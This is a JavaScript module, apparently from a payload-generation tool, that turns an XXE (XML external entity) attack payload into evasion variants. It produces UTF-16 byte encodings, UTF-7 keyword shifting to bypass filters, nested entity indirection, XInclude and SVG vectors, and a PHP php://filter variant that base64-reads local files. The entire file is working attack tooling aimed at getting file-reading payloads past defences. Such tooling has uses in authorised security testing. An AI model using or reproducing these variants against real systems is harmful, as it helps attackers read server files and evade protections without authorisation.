/** XML/XXE transformations with explicit text-vs-byte output semantics. */

import { toUtf7, utf7Shift, utf16LeToBase64, utf16BeToBase64 } from '../utils/encoding.js'
import { finalizeVariants } from '../utils/variants.js'

function withoutDeclaration(payload) {
  return payload.replace(/^\s*<\?xml[^?]*\?>\s*/i, '')
}
function xmlWithEncoding(payload, encoding) {
  return `<?xml version="1.0" encoding="${encoding}"?>\n${withoutDeclaration(payload)}`
}

function applyUtf16(payload) {
  const littleEndian = xmlWithEncoding(payload, 'UTF-16LE')
  const bigEndian = xmlWithEncoding(payload, 'UTF-16BE')
  return [
    {
      payload: littleEndian,
      bytesBase64: utf16LeToBase64(littleEndian),
      encoding: 'UTF-16LE',
      filename: 'xxe-utf16le.xml',
      note: 'Use Download bytes. Copying the preview as text would re-encode it.',
    },
    {
      payload: bigEndian,
      bytesBase64: utf16BeToBase64(bigEndian),
      encoding: 'UTF-16BE',
      filename: 'xxe-utf16be.xml',
      note: 'Use Download bytes. Copying the preview as text would re-encode it.',
    },
  ]
}

function applyUtf7(payload) {
  let body = toUtf7(withoutDeclaration(payload))
  body = body.replace(/DOCTYPE|ENTITY|SYSTEM/g, (keyword) => utf7Shift(keyword))
  return [{
    payload: `<?xml version="1.0" encoding="UTF-7"?>\n${body}`,
    note: 'Legacy/conditional: requires an XML parser that still accepts UTF-7.',
  }]
}

function findExternalEntity(payload) {
  const match = payload.match(/<!ENTITY\s+([A-Za-z_:][\w.:-]*)\s+SYSTEM\s+(['"])([\s\S]*?)\2\s*>/i)
  if (!match) return null
  return { full: match[0], name: match[1], path: match[3] }
}

function quoteSystemId(path) {
  if (!path.includes('"')) return `"${path}"`
  if (!path.includes("'")) return `'${path}'`
  return `"${path.replace(/&/g, '&amp;').replace(/"/g, '&quot;')}"`
}

function applyEntityNesting(payload) {
  const entity = findExternalEntity(payload)
  if (!entity) return []
  const nestedName = `${entity.name}_source`
  const replacement = `<!ENTITY ${nestedName} SYSTEM ${quoteSystemId(entity.path)}>\n<!ENTITY ${entity.name} "&${nestedName};">`
  return [payload.replace(entity.full, replacement)]
}

function applyAlternativeVectors(payload, target) {
  const entity = findExternalEntity(payload)
  if (!entity) return []
  const path = entity.path
  const variants = [
    `<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="${path.replace(/&/g, '&amp;').replace(/"/g, '&quot;')}"/></root>`,
    `<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY ${entity.name} SYSTEM ${quoteSystemId(path)}>]>\n<svg xmlns="http://www.w3.org/2000/svg"><text>&${entity.name};</text></svg>`,
  ]

  if (target === 'php' && path.startsWith('file://')) {
    const localPath = path.replace(/^file:\/\//, '')
    const phpPath = `php://filter/read=convert.base64-encode/resource=${localPath}`
    variants.push(payload.replace(entity.full, `<!ENTITY ${entity.name} SYSTEM "${phpPath}">`))
  }
  return variants
}

export function generateXxeVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = [{ payload, label: 'Original', layers: [] }]

  if (layers.includes('utf16')) {
    applyUtf16(payload).forEach((variant) => allVariants.push({
      ...variant,
      label: `${variant.encoding} bytes`,
      layers: ['utf16'],
      validity: 'validated',
    }))
  }

  if (layers.includes('utf7')) {
    applyUtf7(payload).forEach((variant) => allVariants.push({
      ...variant,
      label: 'UTF-7 Encoding',
      layers: ['utf7'],
      validity: 'legacy',
    }))
  }

  if (layers.includes('entity-nesting')) {
    applyEntityNesting(payload).forEach((value) => allVariants.push({
      payload: value,
      label: 'Entity Indirection',
      layers: ['entity-nesting'],
      validity: 'conditional',
      note: 'Requires external-entity processing to be enabled by the target parser.',
    }))
  }

  if (layers.includes('cdata-wrap')) {
    applyAlternativeVectors(payload, target).forEach((value) => allVariants.push({
      payload: value,
      label: target === 'php' ? 'Alternate XML/PHP Vector' : `Alternate XML Vector (${target})`,
      layers: ['cdata-wrap'],
      validity: 'conditional',
      note: 'XInclude and SVG processing are parser/application dependent.',
    }))
  }

  return finalizeVariants(allVariants, layers)
}
